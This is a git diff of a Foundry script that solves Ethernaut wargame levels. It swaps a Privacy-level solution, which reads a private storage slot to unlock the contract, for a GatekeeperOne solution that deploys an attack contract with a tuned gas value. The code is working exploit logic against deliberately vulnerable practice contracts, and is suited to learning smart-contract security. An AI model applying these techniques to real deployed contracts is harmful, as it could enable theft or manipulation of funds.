@@ -4,7 +4,8 @@ pragma solidity 0.8.20;
 import { Script, console2 } from "forge-std/Script.sol";
 import { Vm } from "forge-std/Vm.sol";
 import { Ethernaut } from "interfaces/IEthernaut.sol";
-import { Privacy } from "src/Level12.sol";
+import { GatekeeperOne } from "src/Level13.sol";
+import { L13Attack } from "src/Level13Attack.sol";
 
 contract Attack is Script {
     Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
@@ -13,22 +14,17 @@ contract Attack is Script {
         uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
         vm.startBroadcast(deployerPrivateKey);
         vm.recordLogs();
-        ethernaut.createLevelInstance{ value: 0.001 ether }(0x131c3249e115491E83De375171767Af07906eA36);
+        ethernaut.createLevelInstance(0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C);
         Vm.Log[] memory entries = vm.getRecordedLogs();
         address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
         console2.log(instanceAddress);
-        Privacy instance = Privacy(instanceAddress);
+        GatekeeperOne instance = GatekeeperOne(instanceAddress);
 
-        // slot 0: bool public locked;
-        // slot 1: uint256 public ID;
-        // slot 2: uint8 + uint8 + uint16
-        // slot 3: bytes32
-        // slot 4: bytes32
-        // slot 5: bytes32 <-- our secret
-        bytes32 secret = vm.load(instanceAddress, bytes32(uint256(5)));
-        bytes16 secret16 = bytes16(secret);
-        instance.unlock(secret16);
-        console2.log(instance.locked());
+        L13Attack attack = new L13Attack(instance);
+        uint256 res = attack.attack(3 * 8191 + 256); // pass zero to find the gas amount needed
+        console2.log(res);
+        (,, address txOrigin) = vm.readCallers();
+        require(instance.entrant() == txOrigin, "Level not solved");
 
         ethernaut.submitLevelInstance(instanceAddress);
         vm.stopBroadcast();
